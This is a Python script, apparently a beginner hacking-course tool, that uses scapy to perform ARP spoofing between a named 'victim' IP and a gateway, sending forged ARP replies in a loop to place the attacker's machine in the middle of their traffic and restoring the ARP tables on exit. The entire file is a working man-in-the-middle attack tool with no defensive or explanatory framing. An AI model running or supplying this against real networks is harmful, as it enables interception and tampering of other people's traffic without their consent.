#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-v", "--victim", dest="victim", help="Victim IP")
    parser.add_option("-g", "--gateway", dest="gateway", help="Gateway IP")
    (options, arguments) = parser.parse_args()
    if not options.victim:
        parser.error("[-] Please specify a victim IP address, use --help for more info.")
    if not options.gateway:
        parser.error("[-] Please specify a gateway IP address, use --help for more info.")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore (dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()

sent_packets_count = 0
try:
    while True:
        spoof(options.victim, options.gateway)
        spoof(options.gateway, options.victim)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Sent " + str(sent_packets_count) + " packets"),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Restoring ARP tables ........ Please wait ........\n")
    restore(options.victim, options.gateway)
    restore(options.gateway, options.victim)
    print("\n[-] Good bye\n")
